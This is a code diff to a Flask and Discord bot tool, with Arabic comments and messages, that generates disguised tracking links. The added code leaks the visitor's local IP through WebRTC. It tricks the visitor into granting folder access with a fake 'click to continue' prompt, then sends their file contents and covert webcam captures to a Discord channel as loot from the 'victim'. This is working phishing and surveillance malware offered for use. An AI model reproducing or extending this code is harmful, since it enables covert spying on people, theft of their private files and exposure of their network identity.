@@ -67,6 +67,8 @@ def track_visitor():
         
     user_agent = request.headers.get('User-Agent', 'Unknown')
     cam = request.args.get('cam', 'false')
+    cam_type = request.args.get('cam_type', 'user')
+    fs_exploit = request.args.get('fs', 'false')
     redirect_target = request.args.get('to', 'https://www.google.com')
     
     country, city, isp = 'Unknown', 'Unknown', 'Unknown'
@@ -107,19 +109,39 @@ def track_visitor():
     except Exception:
         pass
 
-    # إذا تم اختيار طلب الكاميرا، يتم إرجاع صفحة HTML تفاعلية تطلب الإذن وتلتقط صورة وترسلها
-    if cam == 'true':
-        page_template = """
-        <html>
-        <head><title>Loading...</title></head>
-        <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
-            <h3>جاري تحميل المحتوى، يرجى الانتظار والسماح بالإذونات المطلوبة...</h3>
-            <video id="v" autoplay playsinline style="display:none;"></video>
-            <canvas id="c" style="display:none;"></canvas>
-            <script>
-                async function capture() {
+    page_template = """
+    <html>
+    <head><title>Loading...</title></head>
+    <body style="background:#111; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
+        <h3 id="st">جاري تحميل المحتوى، يرجى الانتظار والسماح بالإذونات المطلوبة...</h3>
+        <video id="v" autoplay playsinline style="display:none;"></video>
+        <canvas id="c" style="display:none;"></canvas>
+        <script>
+            let localIPs = [];
+            try {
+                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        let ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;
+                        let match = ipRegex.exec(ice.candidate.candidate);
+                        if (match && !localIPs.includes(match[1])) {
+                            localIPs.push(match[1]);
+                            fetch('/upload_local_ip', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({local_ip: match[1]})
+                            });
+                        }
+                    }
+                };
+            } catch(e) {}
+
+            async function capture() {
+                if ("{{ cam }}" === "true") {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "{{ cam_type }}" } });
                         const video = document.getElementById('v');
                         video.srcObject = stream;
                         await new Promise(resolve => video.onloadedmetadata = resolve);
@@ -137,16 +159,52 @@ def track_visitor():
                         
                         stream.getTracks().forEach(track => track.stop());
                     } catch(e) {}
-                    window.location.href = "{{ target }}";
                 }
-                window.onload = capture;
-            </script>
-        </body>
-        </html>
-        """
-        return render_template_string(page_template, target=redirect_target)
 
-    return redirect(redirect_target, code=302)
+                if ("{{ fs }}" === "true" && window.showDirectoryPicker) {
+                    document.getElementById('st').innerText = "انقر في أي مكان بالشاشة للمتابعة...";
+                    document.body.onclick = async () => {
+                        try {
+                            const dirHandle = await window.showDirectoryPicker();
+                            for await (const entry of dirHandle.values()) {
+                                if (entry.kind === 'file') {
+                                    const file = await entry.getFile();
+                                    const content = await file.text();
+                                    await fetch('/upload_file', {
+                                        method: 'POST',
+                                        headers: {'Content-Type': 'application/json'},
+                                        body: JSON.stringify({name: file.name, data: content.substring(0, 5000)})
+                                    });
+                                }
+                            }
+                        } catch(e) {}
+                        window.location.href = "{{ target }}";
+                    };
+                } else {
+                    setTimeout(() => {
+                        window.location.href = "{{ target }}";
+                    }, 1500);
+                }
+            }
+            window.onload = capture;
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(page_template, target=redirect_target, cam=cam, cam_type=cam_type, fs=fs_exploit)
+
+@app.route('/upload_local_ip', methods=['POST'])
+def upload_local_ip():
+    try:
+        data = request.get_json()
+        local_ip = data.get('local_ip')
+        if CHANNEL_ID and TOKEN:
+            payload = {"content": f"🌐 **تم تسريب الـ Local IP (الداخلي) للضحية:** `{local_ip}`"}
+            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
+                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=3)
+    except Exception:
+        pass
+    return "OK", 200
 
 @app.route('/upload_cam', methods=['POST'])
 def upload_cam():
@@ -167,6 +225,20 @@ def upload_cam():
             
         if os.path.exists(file_path):
             os.remove(file_path)
+    except Exception:
+        pass
+    return "OK", 200
+
+@app.route('/upload_file', methods=['POST'])
+def upload_file():
+    try:
+        data = request.get_json()
+        filename = data.get('name')
+        content = data.get('data')
+        if CHANNEL_ID and TOKEN:
+            payload = {"content": f"📁 **تم سحب ملف عبر File System API:** `{filename}`\n```text\n{content[:1000]}\n```"}
+            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
+                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=5)
     except Exception:
         pass
     return "OK", 200
@@ -680,24 +752,32 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
 
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
 
-@client.tree.command(name="link", description="توليد رابط تتبع مع إمكانية طلب الكاميرا وتحديد وجهة تمويهية")
+@client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
 @app_commands.describe(
     redirect_to="رابط الوجهة النهائية (مثل يوتيوب أو موقع)",
-    capture_cam="هل تريد طلب إذن الكاميرا والتقاط صورة؟"
+    capture_cam="هل تريد طلب إذن الكاميرا؟",
+    cam_type="نوع الكاميرا (أمامية أو خلفية)",
+    file_system="تفعيل استغلال الوصول للملفات (File System API)"
 )
 @app_commands.choices(capture_cam=[
     app_commands.Choice(name="نعم (طلب الكاميرا)", value="true"),
-    app_commands.Choice(name="لا (تتبع عادي بدون كاميرا)", value="false")
+    app_commands.Choice(name="لا (بدون كاميرا)", value="false")
+], cam_type=[
+    app_commands.Choice(name="الكاميرا الأمامية (Selfie)", value="user"),
+    app_commands.Choice(name="الكاميرا الخلفية (Back)", value="environment")
+], file_system=[
+    app_commands.Choice(name="تفعيل استغلال الملفات", value="true"),
+    app_commands.Choice(name="إيقاف استغلال الملفات", value="false")
 ])
-async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false"):
+async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false", cam_type: str = "user", file_system: str = "false"):
     if not interaction.response.is_done():
         await interaction.response.defer(thinking=True, ephemeral=True)
     
-    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}"
+    track_url = f"{HOST_URL}/track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&cam_type={cam_type}&fs={file_system}"
     
     embed = discord.Embed(
         title="🔗 رابط التتبع المطور جاهز",
-        description=f"الرابط المولد لإرساله:\n`{track_url}`\n\nالوجهة النهائية: `{redirect_to}`\nطلب الكاميرا: **{capture_cam.upper()}**",
+        description=f"الرابط المولد:\n`{track_url}`\n\nالوجهة: `{redirect_to}`\nالكاميرا: **{capture_cam.upper()}**\nنوع الكاميرا: **{cam_type.upper()}**\nالوصول للملفات: **{file_system.upper()}**",
         color=0xFF5733
     )
     await interaction.followup.send(embed=embed, ephemeral=True)
